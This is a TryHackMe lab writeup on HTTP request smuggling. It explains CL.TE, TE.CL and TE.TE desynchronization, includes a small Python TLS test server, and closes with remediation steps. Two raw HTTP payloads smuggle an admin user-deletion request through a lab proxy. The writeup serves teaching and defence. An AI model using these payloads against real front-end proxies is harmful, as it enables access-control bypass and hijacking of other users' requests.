# HTTP Request Smuggling — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Web_Security-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red.svg)
![Topic](https://img.shields.io/badge/Topic-Desynchronization-orange.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A technical penetration testing writeup and research guide for the **HTTP Request Smuggling** lab on TryHackMe, examining RFC 7230 desynchronization attacks across multi-tier reverse proxy architectures.

---

## 📋 Executive Summary
HTTP Request Smuggling arises when frontend reverse proxies and backend application servers disagree on message boundary delineation in HTTP/1.1 pipelines. By manipulating `Content-Length` and `Transfer-Encoding: chunked` headers, attackers can "smuggle" hidden requests inside an ostensibly legitimate transaction, enabling cache poisoning, security control bypass, and request hijacking.

* **Vulnerabilities:** CL.TE, TE.CL, and TE.TE HTTP Request Desynchronization
* **Artifacts in Directory:**
  * `hello.py`: Python SSL/TLS test harness running on port 8002
  * `cert.pem` / `key.pem`: SSL certificates for HTTPS request inspection

---

## 🔍 Stage 1: Mechanics of Request Smuggling

RFC 7230 specifies two mechanisms for determining the end of an HTTP request body:
1. `Content-Length` (CL): Explicit byte count of the body.
2. `Transfer-Encoding: chunked` (TE): Body is streamed in hexadecimal length-prefixed blocks until a `0\r\n\r\n` chunk.

When both headers are present:
* **CL.TE Vulnerability:** Frontend prioritizes `Content-Length`, while backend prioritizes `Transfer-Encoding`.
* **TE.CL Vulnerability:** Frontend prioritizes `Transfer-Encoding`, while backend prioritizes `Content-Length`.
* **TE.TE Vulnerability:** Both support `Transfer-Encoding`, but can be manipulated by obfuscating headers (`Transfer-Encoding: xchunked`, `Transfer-Encoding: \tchunked`).

---

## 💥 Stage 2: Attack Implementations

### 2.1 CL.TE Attack (Frontend CL, Backend TE)
The frontend forwards the entire request based on `Content-Length`. The backend reads only the first chunk up to `0\r\n\r\n`, leaving the trailing payload in the pipeline buffer to prefix the next incoming request:

```http
POST / HTTP/1.1
Host: vulnerable.thm
Content-Length: 49
Transfer-Encoding: chunked

0

POST /admin/delete?user=carlos HTTP/1.1
Foo: x
```

### 2.2 TE.CL Attack (Frontend TE, Backend CL)
The frontend processes the entire chunked payload. The backend reads only the specified byte count from `Content-Length`, leaving the smuggled payload queued for the next user:

```http
POST / HTTP/1.1
Host: vulnerable.thm
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin/delete?user=carlos HTTP/1.1
Host: vulnerable.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

## 🛠️ Stage 3: Local SSL Test Harness (`hello.py`)

To analyze request smuggling behaviors over encrypted connections without interference from intermediate proxies, we use `hello.py`:
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 8002), BaseHTTPRequestHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
```

---

## 🛡️ Remediation
1. **Adopt HTTP/2 Exclusively:** Transition edge and backend connections to end-to-end HTTP/2 or HTTP/3, which use binary framing where message boundaries are unambiguous.
2. **Disable Request Reuse:** Disable HTTP/1.1 pipelining and keep-alive connection reuse between frontend and backend tiers.
3. **Normalize Ambiguous Headers:** Configure reverse proxies (e.g. Nginx, HAProxy, AWS ALB) to reject requests presenting both `Content-Length` and `Transfer-Encoding`.
